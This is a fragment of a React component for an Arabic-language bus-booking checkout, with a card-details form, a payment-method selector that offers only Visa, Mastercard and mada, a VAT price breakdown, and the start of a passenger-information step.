                  <CreditCard className="w-5 h-5 text-[#C4A94D]" />
                  <h3 className="font-extrabold text-charcoal text-base">بيانات البطاقة</h3>
                  <span className="text-[10px] text-[#B5AFA3] bg-[#F5F3EF] px-2 py-0.5 rounded-full mr-auto">مطلوب</span>
                </div>

                {/* Card Number */}
                <div>
                  <label className="block text-sm font-bold text-charcoal mb-2 flex items-center gap-2">
                    رقم البطاقة
                    {cardType && (
                      <span className={`text-[10px] px-1.5 py-0.5 rounded-full font-bold ${isCardValid && cardDigits.length >= 13 ? 'bg-green-100 text-green-700' : 'bg-[#FDF8E8] text-[#C4A94D]'}`}>
                        {cardType === 'visa' ? 'Visa' : cardType === 'mastercard' ? 'Mastercard' : cardType === 'mada' ? 'مدى' : cardType === 'amex' ? 'Amex' : ''}
                      </span>
                    )}
                    {cardDigits.length >= 13 && isCardValid && (
                      <span className="flex items-center gap-0.5 text-[10px] text-green-600 font-bold">
                        <svg className="w-3 h-3" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3"><path d="M5 13l4 4L19 7" strokeLinecap="round" strokeLinejoin="round"/></svg>
                        صحيح
                      </span>
                    )}
                    {cardDigits.length >= 13 && !isCardValid && (
                      <span className="flex items-center gap-0.5 text-[10px] text-red-500 font-bold">
                        <svg className="w-3 h-3" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3"><path d="M6 6l12 12M18 6l-12 12" strokeLinecap="round" strokeLinejoin="round"/></svg>
                        غير صحيح
                      </span>
                    )}
                  </label>
                  <div className="relative group">
                    <input
                      type="text"
                      inputMode="numeric"
                      value={cardNumber}
                      onChange={(e) => {
                        const raw = e.target.value.replace(/\D/g, '').slice(0, getCardLength(detectCardType(e.target.value.replace(/\D/g, ''))));
                        setCardNumber(raw.replace(/(.{4})/g, '$1 ').trim());
                      }}
                      placeholder="0000 0000 0000 0000"
                      maxLength={19}
                      autoComplete="cc-number"
                      className={`w-full h-[56px] px-4 pr-14 border rounded-2xl text-left focus:outline-none focus:ring-2 text-charcoal font-mono text-lg tracking-wider bg-[#FCFBF9] transition-all group-hover:border-[#D5CFC5] ${
                        cardDigits.length >= 13
                          ? isCardValid ? 'border-green-400 focus:border-green-500 focus:ring-green-400/15' : 'border-red-300 focus:border-red-400 focus:ring-red-300/15'
                          : 'border-[#E5E0D5] focus:border-[#C4A94D] focus:ring-[#C4A94D]/15'
                      }`}
                      dir="ltr"
                    />
                    <div className="absolute right-4 top-1/2 -translate-y-1/2 transition-transform group-focus-within:scale-110">
                      <CardTypeIconInField cardType={cardType} className="w-10 h-6" />
                    </div>
                  </div>
                  <p className="text-[10px] text-[#B5AFA3] mt-1">يتم كشف نوع البطاقة وفحص الرقم تلقائياً</p>
                </div>

                {/* Expiry + CVV */}
                <div className="grid grid-cols-2 gap-3">
                  <div>
                    <label className="block text-sm font-bold text-charcoal mb-2">تاريخ الانتهاء</label>
                    <input
                      type="text"
                      inputMode="numeric"
                      value={expiryDate}
                      onChange={(e) => setExpiryDate(e.target.value.replace(/\D/g, '').replace(/(\d{2})(\d)/, '$1/$2').slice(0, 5))}
                      onBlur={() => {
                        if (expiryDate && expiryDate.length >= 5 && !isExpValid) {
                          setExpiryDate('');
                        }
                      }}
                      placeholder="MM/YY"
                      autoComplete="cc-exp"
                      className={`w-full h-[56px] px-4 border rounded-2xl text-center focus:outline-none focus:ring-2 text-charcoal font-mono text-base bg-[#FCFBF9] transition-all ${
                        expiryDate.length >= 5
                          ? isExpValid ? 'border-green-400 focus:border-green-500 focus:ring-green-400/15' : 'border-red-300 focus:border-red-400 focus:ring-red-300/15'
                          : 'border-[#E5E0D5] focus:border-[#C4A94D] focus:ring-[#C4A94D]/15'
                      }`}
                      dir="ltr"
                    />
                    {expiryDate.length >= 5 && !isExpValid && (
                      <p className="text-[10px] text-red-500 mt-1 font-bold">تاريخ الانتهاء غير صالح أو قديم</p>
                    )}
                  </div>
                  <div>
                    <label className="block text-sm font-bold text-charcoal mb-2 flex items-center gap-1">
                      CVV
                      <span className="group/cvv relative cursor-help">
                        <svg className="w-3.5 h-3.5 text-[#B5AFA3] hover:text-[#C4A94D] transition-colors" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/><path d="M12 17h.01"/></svg>
                        <span className="absolute bottom-full left-1/2 -translate-x-1/2 mb-2 w-36 bg-charcoal text-white text-[10px] rounded-lg p-2.5 opacity-0 group-hover/cvv:opacity-100 transition-opacity pointer-events-none z-50 text-center leading-relaxed shadow-xl">
                          الرقم المكون من <b>3 أرقام</b> الموجود على شريطة التوقيع خلف البطاقة
                        </span>
                      </span>
                    </label>
                    <input
                      type="password"
                      inputMode="numeric"
                      value={cvv}
                      onChange={(e) => setCvv(e.target.value.replace(/\D/g, '').slice(0, 3))}
                      placeholder="•••"
                      maxLength={3}
                      autoComplete="cc-csc"
                      className={`w-full h-[56px] px-4 border rounded-2xl text-center focus:outline-none focus:ring-2 text-charcoal font-mono text-base bg-[#FCFBF9] transition-all ${
                        cvv.length === 3 ? 'border-green-400 focus:border-green-500 focus:ring-green-400/15' : 'border-[#E5E0D5] focus:border-[#C4A94D] focus:ring-[#C4A94D]/15'
                      }`}
                      dir="ltr"
                    />
                    <p className="text-[10px] text-[#B5AFA3] mt-1">3 أرقام فقط خلف البطاقة</p>
                  </div>
                </div>

                {/* Card Holder - First + Last Name */}
                <div>
                  <label className="block text-sm font-bold text-charcoal mb-2">اسم حامل البطاقة</label>
                  <div className="grid grid-cols-2 gap-3">
                    <input
                      type="text"
                      value={cardHolderFirst}
                      onChange={(e) => setCardHolderFirst(e.target.value.replace(/[^a-zA-Z\s]/g, '').toUpperCase())}
                      placeholder="الاسم الأول"
                      autoComplete="cc-given-name"
                      className="w-full h-[56px] px-4 border border-[#E5E0D5] rounded-2xl text-left focus:outline-none focus:border-[#C4A94D] focus:ring-2 focus:ring-[#C4A94D]/15 text-charcoal text-base bg-[#FCFBF9] transition-all uppercase"
                      dir="ltr"
                    />
                    <input
                      type="text"
                      value={cardHolderLast}
                      onChange={(e) => setCardHolderLast(e.target.value.replace(/[^a-zA-Z\s]/g, '').toUpperCase())}
                      placeholder="الاسم الأخير"
                      autoComplete="cc-family-name"
                      className="w-full h-[56px] px-4 border border-[#E5E0D5] rounded-2xl text-left focus:outline-none focus:border-[#C4A94D] focus:ring-2 focus:ring-[#C4A94D]/15 text-charcoal text-base bg-[#FCFBF9] transition-all uppercase"
                      dir="ltr"
                    />
                  </div>
                </div>

                {/* Security Bar */}
                <div className="bg-gradient-to-r from-[#F8F6F2] to-white border border-[#E5E0D5] rounded-xl p-3 flex flex-wrap items-center justify-center gap-3">
                  {[
                    { icon: <Lock className="w-3 h-3" />, text: 'SSL مشفر' },
                    { icon: <Shield className="w-3 h-3" />, text: 'PCI DSS' },
                    { icon: <Check className="w-3 h-3" />, text: '3D Secure' },
                    { icon: <CreditCard className="w-3 h-3" />, text: 'حماية البيانات' },
                  ].map((item, i) => (
                    <div key={i} className="flex items-center gap-1 text-[#8A7E6B] text-[10px]">
                      <span className="text-green-600">{item.icon}</span>
                      {item.text}
                    </div>
                  ))}
                </div>
              </div>

              {/* ═══ Why Pay With Us ═══ */}
              <div className="bg-white rounded-3xl shadow-sm border border-[#E5E0D5] p-5">
                <h4 className="font-extrabold text-charcoal text-sm mb-3 flex items-center gap-2">
                  <Shield className="w-4 h-4 text-[#C4A94D]" />
                  لماذا الدفع معنا؟
                </h4>
                <div className="grid grid-cols-2 gap-3">
                  {[
                    { icon: <Lock className="w-5 h-5 text-[#C4A94D]" />, title: 'تشفير كامل', desc: 'بياناتك مشفرة بأعلى معايير الأمان' },
                    { icon: <Shield className="w-5 h-5 text-green-600" />, title: 'حماية من الاحتيال', desc: 'نظام متقدم لكشف المحاولات الاحتيالية' },
                    { icon: <Phone className="w-5 h-5 text-blue-500" />, title: 'دعم فني 24/7', desc: 'فريق متخصص جاهز لمساعدتك على مدار الساعة' },
                    { icon: <RotateCcw className="w-5 h-5 text-purple-500" />, title: 'استرداد آمن', desc: 'سياسة استرداد مرنة وعادلة عند الحاجة' },
                  ].map((f, i) => (
                    <div key={i} className="flex items-start gap-2">
                      <div className="w-8 h-8 rounded-lg bg-[#F8F6F2] flex items-center justify-center shrink-0">{f.icon}</div>
                      <div>
                        <p className="text-xs font-bold text-charcoal">{f.title}</p>
                        <p className="text-[10px] text-[#8A7E6B] leading-relaxed">{f.desc}</p>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            </div>

            {/* ── Right: Sticky Sidebar (Amount + Breakdown) ── */}
            <div className="lg:w-[340px] shrink-0">
              <div className="lg:sticky lg:top-[72px] space-y-4">
                {/* Payment Method + Bank Badge */}
                <div className="bg-white rounded-2xl shadow-sm border border-[#E5E0D5] p-4 flex items-center gap-3">
                  {bankInfo ? (
                    <div className="w-12 h-10 rounded-xl flex items-center justify-center shrink-0 overflow-hidden" style={{ backgroundColor: bankColor + '15' }}>
                      <img 
                        src={bankInfo.logoUrl} 
                        alt={bankInfo.name} 
                        className="w-10 h-6 object-contain" 
                      />
                    </div>
                  ) : (
                    <div className="w-12 h-10 rounded-xl bg-[#F8F6F2] flex items-center justify-center">{pm?.icon}</div>
                  )}
                  <div>
                    <p className="text-[10px] text-[#8A7E6B]">{bankInfo ? 'البنك المصدر' : 'طريقة الدفع'}</p>
                    <p className="text-sm font-extrabold text-charcoal">{bankInfo?.name || pm?.name}</p>
                  </div>
                </div>

                {/* Amount Card */}
                <div className="bg-gradient-to-br from-charcoal to-[#2A2A2A] rounded-3xl p-5 text-white shadow-xl text-center">
                  <p className="text-white/60 text-xs mb-1">المبلغ المطلوب دفعه</p>
                  <p className="text-4xl font-extrabold">{finalTotal} <span className="text-lg font-bold">ر.س</span></p>
                  <div className="flex items-center justify-center gap-1 mt-2 text-[10px] text-white/40">
                    <Lock className="w-3 h-3" />
                    دفع آمن ومشفر
                  </div>
                </div>

                {/* Price Breakdown */}
                <div className="bg-white rounded-3xl shadow-sm border border-[#E5E0D5] p-4 space-y-2 text-sm">
                  <h4 className="font-extrabold text-charcoal text-xs pb-2 border-b border-[#F0EDE4] flex items-center gap-1">
                    <Receipt className="w-3.5 h-3.5 text-[#C4A94D]" />
                    كشف الحساب
                  </h4>
                  <div className="flex justify-between text-xs"><span className="text-[#8A7E6B]">{currentFare.name} × {bookingData.passengers}</span><span className="text-charcoal font-bold">{subtotal.toFixed(2)} ر.س</span></div>
                  <div className="flex justify-between text-xs"><span className="text-[#8A7E6B]">ضريبة القيمة المضافة (15%)</span><span className="text-charcoal font-bold">{vat.toFixed(2)} ر.س</span></div>
                  {bookingData.tripType === 'round-trip' && <div className="flex justify-between text-xs text-green-600"><span>خصم ذهاب وعودة</span><span className="font-bold">-{(total * 0.15).toFixed(2)} ر.س</span></div>}
                  <div className="border-t border-[#C4A94D]/20 pt-2 flex justify-between font-extrabold">
                    <span className="text-charcoal text-sm">الإجمالي</span>
                    <span className="text-[#C4A94D] text-lg">{finalTotal} <span className="text-xs">ر.س</span></span>
                  </div>
                </div>
              </div>
            </div>
          </div>

          {/* ─── Pay Button ─── */}
          <div className="sticky bottom-0 left-0 right-0 bg-white/90 backdrop-blur-xl border-t border-[#E5E0D5] py-3 px-4 -mx-4">
            <button
              onClick={handlePaymentDone}
              disabled={isLoading || !isCardComplete}
              className={`w-full h-14 text-white font-bold rounded-2xl shadow-lg transition-all text-lg flex items-center justify-center gap-2 overflow-hidden relative group ${
                !isLoading && isCardComplete
                  ? 'bg-gradient-to-r from-[#C4A94D] to-[#B8983E] hover:shadow-xl hover:shadow-[#C4A94D]/20 hover:scale-[1.01] active:scale-[0.99]'
                  : 'bg-[#D5CFC5] cursor-not-allowed'
              }`}
            >
              <span className="relative z-10 flex items-center gap-2">
                {isLoading ? (
                  <>
                    <svg className="animate-spin w-5 h-5" viewBox="0 0 24 24" fill="none"><circle className="opacity-25" cx="12" cy="12" r="10" stroke="white" strokeWidth="4" /><path className="opacity-75" fill="white" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" /></svg>
                    جارٍ معالجة الدفع...
                  </>
                ) : (
                  <>
                    <Lock className="w-5 h-5" />
                    دفع {finalTotal} ر.س
                  </>
                )}
              </span>
              {!isLoading && isCardComplete && (
                <div className="absolute inset-0 bg-gradient-to-r from-[#B8983E] to-[#C4A94D] opacity-0 group-hover:opacity-100 transition-opacity duration-300" />
              )}
            </button>
          </div>
        </div>
      </div>
    );
  }

  // ═══════════════════════════════════════════════════════════════
  //  STEP 4: PAYMENT METHOD (Premium Redesign)
  // ═══════════════════════════════════════════════════════════════
  if (step === 'payment_method') {
    const paymentAlert = (selectedPayment === 'apple_pay' || selectedPayment === 'bank_transfer') ? selectedPayment : null;
    return (
      <div className="fixed inset-0 z-[70] bg-gradient-to-b from-[#F0EDE4] to-[#FAFAF8] overflow-y-auto">
        <LoadingScreen isVisible={isLoading} message={loadingMsg} />

        {/* ─── Header ─── */}
        <div className="sticky top-0 z-20 bg-white/90 backdrop-blur-xl border-b border-[#E5E0D5] shadow-sm">
          <div className="max-w-2xl mx-auto px-4 py-3 flex items-center justify-between">
            <button onClick={() => !isLoading && setStep('passenger_info')} className="w-10 h-10 rounded-full bg-[#F8F6F2] flex items-center justify-center text-[#8A7E6B] hover:text-charcoal transition-all hover:bg-[#F0EDE4] active:scale-95">
              <ChevronLeft className="w-5 h-5" />
            </button>
            <div className="flex items-center gap-3">
              <h2 className="text-base font-extrabold text-charcoal">طريقة الدفع</h2>
              <span className="text-xs bg-gradient-to-r from-[#C4A94D] to-[#B8983E] text-white px-2.5 py-0.5 rounded-full font-bold">4/5</span>
            </div>
            <img src="/sat-logo.png" alt="سات" className="h-8 w-auto" />
          </div>
        </div>

        <div className="max-w-2xl mx-auto px-4 py-5 space-y-5">
          {/* ═══ 5-Step Professional Progress Bar ═══ */}
          <div className="bg-white rounded-2xl shadow-sm border border-[#E5E0D5] p-4">
            <div className="flex items-center justify-between relative">
              {/* Connecting line */}
              <div className="absolute top-[18px] left-[10%] right-[10%] h-[2px] bg-[#E5E0D5] -z-0" />
              <div className="absolute top-[18px] left-[10%] right-[10%] h-[2px] bg-[#E5E0D5] -z-0">
                <div className="h-full bg-gradient-to-l from-[#C4A94D] to-[#C4A94D] transition-all duration-700" style={{ width: '75%' }} />
              </div>
              {[
                { label: 'البحث', num: 1, done: true },
                { label: 'المقاعد', num: 2, done: true },
                { label: 'التفاصيل', num: 3, done: true },
                { label: 'الدفع', num: 4, done: false, active: true },
                { label: 'التأكيد', num: 5, done: false },
              ].map((s, i) => (
                <div key={i} className="flex flex-col items-center gap-1.5 relative z-10">
                  <div className={`w-9 h-9 rounded-full flex items-center justify-center text-xs font-extrabold transition-all duration-500 shadow-sm ${
                    s.active ? 'bg-gradient-to-r from-[#C4A94D] to-[#B8983E] text-white shadow-lg scale-110 ring-4 ring-[#C4A94D]/20' :
                    s.done ? 'bg-[#C4A94D] text-white' : 'bg-white text-[#B5AFA3] border-2 border-[#E5E0D5]'
                  }`}>
                    {s.done && !s.active ? <Check className="w-4 h-4" /> : s.num}
                  </div>
                  <span className={`text-[10px] font-bold transition-colors ${s.active ? 'text-[#C4A94D]' : s.done ? 'text-[#8A7E6B]' : 'text-[#B5AFA3]'}`}>{s.label}</span>
                </div>
              ))}
            </div>
          </div>

          {/* ─── Main Content: Payment Methods + Sidebar ─── */}
          <div className="flex flex-col lg:flex-row gap-5">
            {/* ── Left: Payment Methods ── */}
            <div className="flex-1 min-w-0 space-y-4">
              {/* Title */}
              <div className="flex items-center gap-2 mb-1">
                <Wallet className="w-5 h-5 text-[#C4A94D]" />
                <h3 className="font-extrabold text-charcoal text-lg">اختر وسيلة الدفع</h3>
              </div>

              {/* Payment Method Cards */}
              <div className="space-y-3">
                {([
                  { id: 'visa', name: 'Visa', desc: 'بطاقة ائتمان Visa', icon: <VisaIcon className="w-20 h-7" />, features: ['دفع آمن 100%', 'معالجة فورية', 'تشفير SSL'] },
                  { id: 'mastercard', name: 'Mastercard', desc: 'بطاقة ائتمان Mastercard', icon: <MastercardIcon className="w-10 h-8" />, features: ['دفع آمن 100%', 'معالجة فورية', 'تشفير SSL'] },
                  { id: 'mada', name: 'مدى', desc: 'بطاقة صراف مدى', icon: <MadaIcon className="w-20 h-8" />, features: ['لا توجد رسوم إضافية', 'معالجة فورية', 'تشفير SSL'] },
                  { id: 'apple_pay', name: 'Apple Pay', desc: 'الدفع السريع عبر Apple Pay', icon: (
                    <svg className="w-14 h-7" viewBox="0 0 56 24" fill="none">
                      <path d="M11.5 4.2c.6-.8 1-1.8.9-2.8-1 .1-2.1.6-2.8 1.5-.6.7-.9 1.7-.8 2.6 1 0 2-.5 2.7-1.3zM12 5.5c-1.4-.1-2.6.8-3.3.8s-1.7-.8-2.8-.8C4.3 5.5 2.5 7 2.5 9.8c0 1.7.6 3.4 1.7 4.6.8.9 1.7 1.4 2.6 1.4 1 0 1.5-.6 2.7-.6s1.7.6 2.7.6c1.2 0 2.1-1.1 2.9-2 .9-1.3 1.3-2.5 1.3-2.6-.1 0-2.5-1-2.5-3.7 0-2.3 1.8-3.4 1.9-3.5-1.1-1.6-2.7-1.7-3.3-1.8-.1 0-.2 0-.3 0z" fill="#000"/>
                      <text x="18" y="16" fontSize="13" fontWeight="700" fill="#000" fontFamily="system-ui">Pay</text>
                    </svg>
                  ), features: ['لا يحتاج إدخال بطاقة', 'مصادقة بالبصمة', 'دفع لحظي'] },
                  { id: 'bank_transfer', name: 'التحويل البنكي', desc: 'الدفع عبر التحويل البنكي المباشر', icon: <Briefcase className="w-8 h-8 text-[#8A7E6B]" />, features: ['تحويل مباشر', 'تأكيد خلال 24 ساعة', 'آمن وموثوق'] },
                ] as const).map(m => {
                  const isSelected = selectedPayment === m.id;
                  const isUnavailable = m.id === 'apple_pay' || m.id === 'bank_transfer';
                  return (
                    <button key={m.id}
                      onClick={() => { setSelectedPayment(m.id); }}
                      className={`group w-full text-right rounded-2xl border-2 p-4 transition-all duration-300 relative overflow-hidden ${
                        isSelected && !isUnavailable ? 'border-[#C4A94D] bg-gradient-to-br from-[#FDF8E8] to-white shadow-lg shadow-[#C4A94D]/10' :
                        isUnavailable && isSelected ? 'border-orange-300 bg-orange-50/50 shadow-md' :
                        'border-transparent bg-white shadow-sm hover:shadow-md hover:border-[#E5E0D5]'
                      }`}>
                      {isSelected && !isUnavailable && (
                        <div className="absolute top-3 left-3 w-6 h-6 rounded-full bg-[#C4A94D] flex items-center justify-center shadow-md">
                          <Check className="w-3.5 h-3.5 text-white" />
                        </div>
                      )}
                      {isUnavailable && isSelected && (
                        <div className="absolute top-3 left-3 w-6 h-6 rounded-full bg-orange-400 flex items-center justify-center shadow-md">
                          <AlertTriangle className="w-3.5 h-3.5 text-white" />
                        </div>
                      )}
                      <div className="flex items-center gap-4">
                        <div className={`w-16 h-12 rounded-xl flex items-center justify-center shrink-0 transition-colors ${
                          isSelected ? (isUnavailable ? 'bg-orange-100' : 'bg-[#C4A94D]/10') : 'bg-[#F8F6F2] group-hover:bg-[#F5F3EF]'
                        }`}>
                          {m.icon}
                        </div>
                        <div className="flex-1 min-w-0">
                          <p className="font-extrabold text-charcoal text-sm">{m.name}</p>
                          <p className="text-[11px] text-[#8A7E6B] mt-0.5">{m.desc}</p>
                          <div className="flex items-center gap-2 mt-1.5 flex-wrap">
                            {m.features.map((f, fi) => (
                              <span key={fi} className="flex items-center gap-0.5 text-[10px] text-[#8A7E6B]">
                                <Check className="w-2.5 h-2.5 text-green-500" />
                                {f}
                              </span>
                            ))}
                          </div>
                        </div>
                      </div>
                    </button>
                  );
                })}
              </div>

              {/* Unavailable service alert */}
              {paymentAlert === 'apple_pay' && (
                <div className="bg-orange-50 border border-orange-200 rounded-2xl p-4 flex items-start gap-3 animate-fade-in">
                  <div className="w-9 h-9 rounded-full bg-orange-100 flex items-center justify-center shrink-0">
                    <AlertTriangle className="w-4 h-4 text-orange-500" />
                  </div>
                  <div>
                    <p className="text-orange-700 font-bold text-sm">خدمة Apple Pay غير متاحة حالياً</p>
                    <p className="text-orange-600 text-xs mt-1 leading-relaxed">نعمل على تحسينها لتقديم تجربة دفع أسرع وأكثر أماناً قريباً. يمكنك استخدام Visa أو Mastercard أو مدى بدلاً من ذلك.</p>
                  </div>
                </div>
              )}
              {paymentAlert === 'bank_transfer' && (
                <div className="bg-blue-50 border border-blue-200 rounded-2xl p-4 flex items-start gap-3 animate-fade-in">
                  <div className="w-9 h-9 rounded-full bg-blue-100 flex items-center justify-center shrink-0">
                    <Briefcase className="w-4 h-4 text-blue-500" />
                  </div>
                  <div>
                    <p className="text-blue-700 font-bold text-sm">التحويل البنكي غير متاح حالياً</p>
                    <p className="text-blue-600 text-xs mt-1 leading-relaxed">لضمان تأكيد الحجز بشكل فوري، يرجى اختيار إحدى وسائل الدفع الإلكترونية المتاحة (Visa / Mastercard / مدى).</p>
                  </div>
                </div>
              )}

              {/* Security Badges */}
              <div className="bg-white rounded-2xl shadow-sm border border-[#E5E0D5] p-4">
                <div className="flex items-center gap-2 mb-3">
                  <Shield className="w-4 h-4 text-green-600" />
                  <span className="text-xs font-extrabold text-charcoal">معايير الأمان والحماية</span>
                </div>
                <div className="grid grid-cols-2 gap-2">
                  {[
                    { icon: <Lock className="w-3.5 h-3.5" />, text: 'اتصال مشفر SSL' },
                    { icon: <Shield className="w-3.5 h-3.5" />, text: 'PCI DSS Secure' },
                    { icon: <Check className="w-3.5 h-3.5" />, text: 'حماية 3D Secure' },
                    { icon: <CreditCard className="w-3.5 h-3.5" />, text: 'لا توجد رسوم إضافية' },
                  ].map((b, i) => (
                    <div key={i} className="flex items-center gap-2 text-[#8A7E6B] text-[11px]">
                      <span className="text-[#C4A94D]">{b.icon}</span>
                      {b.text}
                    </div>
                  ))}
                </div>
              </div>
            </div>

            {/* ── Right: Sticky Trip Summary ── */}
            <div className="lg:w-[340px] shrink-0">
              <div className="lg:sticky lg:top-[72px] space-y-4">
                <div className="bg-white rounded-3xl shadow-lg border border-[#E5E0D5] overflow-hidden">
                  {/* Gold Header */}
                  <div className="bg-gradient-to-r from-[#C4A94D] to-[#B8983E] px-4 py-3 text-white">
                    <p className="text-white/70 text-[10px] font-bold uppercase tracking-wider">ملخص الحجز</p>
                    <div className="flex items-center gap-2 mt-1">
                      <span className="text-sm font-bold">{bookingData.from}</span>
                      <svg className="w-4 h-4 text-white/60" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
                      <span className="text-sm font-bold">{bookingData.to}</span>
                    </div>
                    <div className="flex items-center gap-3 mt-1 text-[11px] text-white/70">
                      <span className="flex items-center gap-1"><Calendar className="w-3 h-3" />{formatDate(bookingData.pickupDate)}</span>
                      <span className="flex items-center gap-1"><Users className="w-3 h-3" />{bookingData.passengers} مسافر</span>
                    </div>
                  </div>
                  {/* Body */}
                  <div className="p-4 space-y-3">
                    {activeTrip && (
                      <div className="flex items-center gap-2 text-xs text-[#8A7E6B] pb-2 border-b border-[#F0EDE4]">
                        <Bus className="w-3.5 h-3.5 text-[#C4A94D]" />
                        <span>{activeTrip.tripNumber} · {activeTrip.fareClass}</span>
                        <span className="text-[#E5E0D5]">|</span>
                        <Clock className="w-3.5 h-3.5 text-[#C4A94D]" />
                        <span dir="ltr">{activeTrip.departureTime} - {activeTrip.arrivalTime}</span>
                      </div>
                    )}
                    <div className="space-y-2 text-sm">
                      <div className="flex justify-between"><span className="text-[#8A7E6B]">{currentFare.name} × {bookingData.passengers}</span><span className="text-charcoal font-bold">{subtotal.toFixed(2)} ر.س</span></div>
                      <div className="flex justify-between"><span className="text-[#8A7E6B]">ضريبة القيمة المضافة (15%)</span><span className="text-charcoal font-bold">{vat.toFixed(2)} ر.س</span></div>
                      {bookingData.tripType === 'round-trip' && <div className="flex justify-between text-green-600 text-sm"><span>خصم ذهاب وعودة</span><span className="font-bold">-{(total * 0.15).toFixed(2)} ر.س</span></div>}
                    </div>
                    <div className="border-t border-[#C4A94D]/20 pt-3 flex justify-between font-extrabold">
                      <span className="text-charcoal">الإجمالي</span>
                      <span className="text-[#C4A94D] text-lg">{finalTotal} <span className="text-xs">ر.س</span></span>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>

          {/* ─── Pay Button ─── */}
          <div className="sticky bottom-0 left-0 right-0 bg-white/90 backdrop-blur-xl border-t border-[#E5E0D5] py-3 px-4 -mx-4 mt-2">
            <button onClick={handlePaymentMethodNext} disabled={!selectedPayment || isLoading || selectedPayment === 'apple_pay' || selectedPayment === 'bank_transfer'}
              className={`w-full h-14 text-white font-bold rounded-2xl shadow-lg transition-all text-lg flex items-center justify-center gap-2 overflow-hidden relative group ${
                selectedPayment && !isLoading && selectedPayment !== 'apple_pay' && selectedPayment !== 'bank_transfer'
                  ? 'bg-gradient-to-r from-[#C4A94D] to-[#B8983E] hover:shadow-xl hover:shadow-[#C4A94D]/20 hover:scale-[1.01] active:scale-[0.99]'
                  : 'bg-[#D5CFC5] cursor-not-allowed'
              }`}>
              <span className="relative z-10 flex items-center gap-2">
                <Lock className="w-5 h-5" />
                متابعة إلى بيانات البطاقة
              </span>
              {selectedPayment && selectedPayment !== 'apple_pay' && selectedPayment !== 'bank_transfer' && (
                <div className="absolute inset-0 bg-gradient-to-r from-[#B8983E] to-[#C4A94D] opacity-0 group-hover:opacity-100 transition-opacity duration-300" />
              )}
            </button>
          </div>
        </div>
      </div>
    );
  }

  // ═══════════════════════════════════════════════════════════════
  //  STEP 3: PASSENGER INFO
  // ═══════════════════════════════════════════════════════════════
  if (step === 'passenger_info') {
    return (
      <div className="fixed inset-0 z-[70] bg-gradient-to-b from-[#F0EDE4] to-white overflow-y-auto">
        <LoadingScreen isVisible={isLoading} message={loadingMsg} />

        {/* Header */}
        <div className="sticky top-0 z-10 bg-white border-b border-[#E5E0D5] shadow-sm">
          <div className="max-w-2xl mx-auto px-4 py-3 flex items-center justify-between">
            <button onClick={() => !isLoading && setStep('seat_selection')} className="w-10 h-10 rounded-full bg-[#F8F6F2] flex items-center justify-center text-[#8A7E6B] hover:text-charcoal transition-colors">
              <ChevronLeft className="w-5 h-5" />
            </button>
            <div className="flex items-center gap-3">
              <h2 className="text-base font-extrabold text-charcoal">بيانات المسافرين</h2>
              <span className="text-xs bg-gradient-to-r from-[#C4A94D] to-[#B8983E] text-white px-2.5 py-0.5 rounded-full font-bold">3/5</span>
            </div>
            <img src="/sat-logo.png" alt="سات" className="h-8 w-auto" />
          </div>
        </div>

        <div className="max-w-2xl mx-auto px-4 py-4 space-y-4">
          {/* ═══ 5-Step Progress Bar ═══ */}
          <div className="bg-white rounded-2xl shadow-sm border border-[#E5E0D5] p-4 mb-4">
            <div className="flex items-center justify-between relative">
              <div className="absolute top-[18px] left-[10%] right-[10%] h-[2px] bg-[#E5E0D5] -z-0">
                <div className="h-full bg-gradient-to-l from-[#C4A94D] to-[#C4A94D] transition-all duration-700" style={{ width: '50%' }} />
              </div>
              {[
                { label: 'البحث', num: 1, done: true, active: false },
                { label: 'المقاعد', num: 2, done: true, active: false },
                { label: 'التفاصيل', num: 3, done: false, active: true },
                { label: 'الدفع', num: 4, done: false, active: false },
                { label: 'التأكيد', num: 5, done: false, active: false },
              ].map((s, i) => (
                <div key={i} className="flex flex-col items-center gap-1.5 relative z-10">
                  <div className={`w-9 h-9 rounded-full flex items-center justify-center text-xs font-extrabold transition-all duration-500 shadow-sm ${
                    s.active ? 'bg-gradient-to-r from-[#C4A94D] to-[#B8983E] text-white shadow-lg scale-110 ring-4 ring-[#C4A94D]/20' :
                    s.done ? 'bg-[#C4A94D] text-white' : 'bg-white text-[#B5AFA3] border-2 border-[#E5E0D5]'
                  }`}>
                    {s.done && !s.active ? <Check className="w-4 h-4" /> : s.num}
                  </div>
                  <span className={`text-[10px] font-bold transition-colors ${s.active ? 'text-[#C4A94D]' : s.done ? 'text-[#8A7E6B]' : 'text-[#B5AFA3]'}`}>{s.label}</span>
                </div>
              ))}
            </div>
          </div>

          {/* ═══ Trip Summary Card (AT TOP) ═══ */}
          {activeTrip && (
            <div className="bg-white rounded-3xl shadow-lg border border-[#E5E0D5] overflow-hidden">
              {/* Gold Header */}
              <div className="bg-gradient-to-r from-[#C4A94D] to-[#B8983E] px-4 py-3 text-white">
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <Bus className="w-4 h-4" />
                    <span className="text-xs font-bold">{activeTrip.tripNumber}</span>
                    <span className="text-[10px] bg-white/20 px-1.5 py-0.5 rounded-full">{activeTrip.fareClass}</span>
                  </div>
                  <span className="text-lg font-extrabold">{finalTotal} <span className="text-xs">ر.س</span></span>
                </div>
                <div className="flex items-center gap-2 mt-1 text-xs text-white/80">
                  <span>{activeTrip.from}</span>
                  <span>&rarr;</span>
                  <span>{activeTrip.to}</span>
                  <span className="text-white/40">|</span>
                  <Clock className="w-3 h-3" />
                  <span dir="ltr">{activeTrip.departureTime} - {activeTrip.arrivalTime}</span>
                </div>
              </div>
              {/* Body */}
              <div className="p-4 space-y-3">
                {/* Route Stats */}
                <div className="grid grid-cols-4 gap-2 text-center">
                  <div className="bg-[#FAFAF8] rounded-lg p-2">
                    <Clock className="w-3 h-3 text-[#C4A94D] mx-auto mb-0.5" />
                    <p className="text-[9px] text-[#8A7E6B]">المدة</p>
                    <p className="text-xs font-bold text-charcoal">{activeTrip.duration}</p>
                  </div>
                  <div className="bg-[#FAFAF8] rounded-lg p-2">
                    <MapPin className="w-3 h-3 text-[#C4A94D] mx-auto mb-0.5" />
